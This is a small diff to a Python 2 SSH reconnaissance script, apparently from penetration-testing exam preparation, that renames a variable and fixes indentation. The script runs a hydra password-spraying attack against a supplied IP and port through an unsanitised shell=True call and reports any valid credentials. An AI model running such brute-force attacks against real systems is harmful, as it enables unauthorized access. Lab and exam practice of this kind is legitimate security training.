@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import subprocess
 import sys
+import os
 
 if len(sys.argv) != 3:
     print "Usage: sshrecon.py <ip address> <port>"
@@ -33,12 +34,12 @@ f.close
 #run manually for extensive brute
 
 print "INFO: Performing hydra ssh scan against " + ip_address 
-HYDRA = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/ssh/%s_sshhydra.txt -u %s -s %s ssh" % (ip_address, ip_address, port)
+HYDRASSH = "hydra -L /usr/share/wordlists/lists/userlist.txt -P /usr/share/wordlists/lists/quick_password_spray.txt -f -o /root/scripts/recon_enum/results/exam/ssh/%s_sshhydra.txt -u %s -s %s ssh" % (ip_address, ip_address, port)
 try:
-    results = subprocess.check_output(HYDRA, shell=True)
+    results = subprocess.check_output(HYDRASSH, shell=True)
     resultarr = results.split("\n")
     for result in resultarr:
         if "login:" in result:
-	    print "[*] Valid ssh credentials found: " + result 
+	        print "[*] Valid ssh credentials found: " + result 
 except:
     print "INFO: No valid ssh credentials found"
